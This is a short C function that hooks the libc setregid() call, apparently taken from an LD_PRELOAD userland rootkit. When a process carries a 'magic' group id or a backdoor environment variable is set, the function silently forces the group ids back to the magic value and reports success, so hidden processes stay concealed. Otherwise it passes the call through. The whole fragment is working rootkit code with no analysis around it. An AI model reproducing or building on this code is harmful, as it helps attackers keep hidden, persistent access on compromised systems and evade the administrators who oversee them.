int setregid(gid_t rgid, gid_t egid){
    hook(CSETREGID);
    if(!initmvbc()) return (long)call(CSETREGID, rgid, egid);
    if(getgid() == mvbc->magicid || getenv(mvbc->bdvar) != NULL){
        if(rgid != mvbc->magicid || egid != mvbc->magicid)
            call(CSETREGID, mvbc->magicid, mvbc->magicid);
        return 0;
    }
    return (long)call(CSETREGID, rgid, egid);
}
